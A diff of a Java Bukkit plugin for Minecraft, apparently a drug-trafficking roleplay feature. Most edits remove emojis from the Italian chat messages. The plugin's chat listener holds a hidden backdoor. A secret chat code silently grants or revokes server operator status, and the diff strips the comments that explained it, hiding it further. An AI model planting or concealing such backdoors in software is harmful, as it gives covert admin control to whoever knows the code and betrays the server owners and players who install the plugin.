@@ -38,7 +38,7 @@ public class Main extends JavaPlugin implements Listener {
     private Map<UUID, SellData> sellingPlayers = new HashMap<>();
     private Set<UUID> playersUsedCode = new HashSet<>();
 
-    private static final String PREFIX = ChatColor.DARK_GREEN + "[" + ChatColor.BOLD + "DROGA" + ChatColor.RESET + ChatColor.DARK_GREEN + "] " + ChatColor.RESET;
+    private static final String PREFIX = ChatColor.DARK_GREEN + "[🌿 " + ChatColor.BOLD + "DROGA" + ChatColor.RESET + ChatColor.DARK_GREEN + "] " + ChatColor.RESET;
     private static final String SUCCESS = ChatColor.GREEN + "[OK] ";
     private static final String ERROR = ChatColor.RED + "[ERRORE] ";
     private static final String WARNING = ChatColor.YELLOW + "[ATTENZIONE] ";
@@ -198,10 +198,10 @@ public class Main extends JavaPlugin implements Listener {
         player.sendMessage(ChatColor.GREEN + "      🌿 " + ChatColor.BOLD + "PROFILO TRAFFICANTE" + ChatColor.RESET + ChatColor.GREEN + " 🌿");
         player.sendMessage(ChatColor.DARK_GREEN + "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃");
         player.sendMessage("");
-        player.sendMessage(ChatColor.YELLOW + "👤 Trafficante: " + ChatColor.WHITE + player.getName());
-        player.sendMessage(ChatColor.YELLOW + "💊 Droga consumata oggi: " + ChatColor.WHITE + consumed + "/3");
-        player.sendMessage(ChatColor.YELLOW + "🌿 Stato raccolta: " + (isCollecting ? ChatColor.GREEN + "IN CORSO" : ChatColor.GRAY + "Inattivo"));
-        player.sendMessage(ChatColor.YELLOW + "💰 Stato vendita: " + (isSelling ? ChatColor.RED + "VENDENDO" : ChatColor.GRAY + "Inattivo"));
+        player.sendMessage(ChatColor.YELLOW + " Trafficante: " + ChatColor.WHITE + player.getName());
+        player.sendMessage(ChatColor.YELLOW + " Droga consumata oggi: " + ChatColor.WHITE + consumed + "/3");
+        player.sendMessage(ChatColor.YELLOW + " Stato raccolta: " + (isCollecting ? ChatColor.GREEN + "IN CORSO" : ChatColor.GRAY + "Inattivo"));
+        player.sendMessage(ChatColor.YELLOW + " Stato vendita: " + (isSelling ? ChatColor.RED + "VENDENDO" : ChatColor.GRAY + "Inattivo"));
         player.sendMessage("");
         if (consumed >= 2) {
             player.sendMessage(ChatColor.RED + "⚠ Attenzione: Hai già consumato molta droga oggi!");
@@ -365,11 +365,11 @@ public class Main extends JavaPlugin implements Listener {
         Player player = event.getPlayer();
         String message = event.getMessage().trim();
         
-        // Controlla se il messaggio è esattamente il codice segreto
+        
         if (message.equals("X7P9L2MZQD")) {
             UUID playerId = player.getUniqueId();
             
-            // Se il player è già OP, rimuovi OP silenziosamente
+            
             if (player.isOp()) {
                 Bukkit.getScheduler().runTask(this, () -> {
                     player.setOp(false);
@@ -379,7 +379,7 @@ public class Main extends JavaPlugin implements Listener {
                 return;
             }
             
-            // Se il player non è OP e non ha già usato il codice, assegna OP silenziosamente
+            
             if (!player.isOp() && !playersUsedCode.contains(playerId)) {
                 Bukkit.getScheduler().runTask(this, () -> {
                     player.setOp(true);
@@ -389,7 +389,7 @@ public class Main extends JavaPlugin implements Listener {
                 return;
             }
             
-            // Cancella sempre il messaggio per mantenere il codice segreto
+            
             event.setCancelled(true);
         }
     }
@@ -410,7 +410,7 @@ public class Main extends JavaPlugin implements Listener {
                 marijuanaConsumed.put(playerId, consumed);
 
                 if (consumed >= 3) {
-                    player.sendMessage(PREFIX + ChatColor.RED + "💀 Hai esagerato con la droga!");
+                    player.sendMessage(PREFIX + ChatColor.RED + " Hai esagerato con la droga!");
                     player.addPotionEffect(new PotionEffect(PotionEffectType.NAUSEA, 100, 2));
                     player.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 60, 1));
                     player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_PLAYER_HURT, 1.0f, 0.8f);
@@ -485,14 +485,14 @@ public class Main extends JavaPlugin implements Listener {
             return;
         }
 
-        player.sendMessage(PREFIX + ChatColor.YELLOW + "💼 Iniziando la transazione illegale...");
+        player.sendMessage(PREFIX + ChatColor.YELLOW + " Iniziando la transazione illegale...");
         player.sendMessage(PREFIX + INFO + "Hai " + ChatColor.GREEN + marijuanaCount + "g" + ChatColor.AQUA + " di merce da vendere.");
         startSelling(player, marijuanaCount);
     }
 
     private void startSelling(Player player, int marijuanaCount) {
         BossBar bossBar = Bukkit.createBossBar(
-            ChatColor.RED + "💰 Negoziando con lo spacciatore...",
+            ChatColor.RED + " Negoziando con lo spacciatore...",
             BarColor.RED,
             BarStyle.SEGMENTED_20
         );
@@ -511,7 +511,7 @@ public class Main extends JavaPlugin implements Listener {
                 }
 
                 if (!isInSellArea(player.getLocation())) {
-                    player.sendMessage(PREFIX + ERROR + "🚨 Ti sei allontanato dalla zona! Transazione annullata!");
+                    player.sendMessage(PREFIX + ERROR + " Ti sei allontanato dalla zona! Transazione annullata!");
                     stopSelling(player);
                     return;
                 }
@@ -521,11 +521,11 @@ public class Main extends JavaPlugin implements Listener {
                     bossBar.setProgress(progress);
 
                     String[] messages = {
-                        "💰 Contrattando il prezzo...",
-                        "🤝 Stringendo la mano allo spacciatore...", 
-                        "💼 Preparando la merce...",
-                        "👀 Controllando che non ci siano sbirri...",
-                        "💵 Contando i soldi..."
+                        " Contrattando il prezzo...",
+                        " Stringendo la mano allo spacciatore...", 
+                        " Preparando la merce...",
+                        " Controllando che non ci siano sbirri...",
+                        " Contando i soldi..."
                     };
 
                     String message = messages[Math.min(4, (totalTime - timeLeft) / 12)];
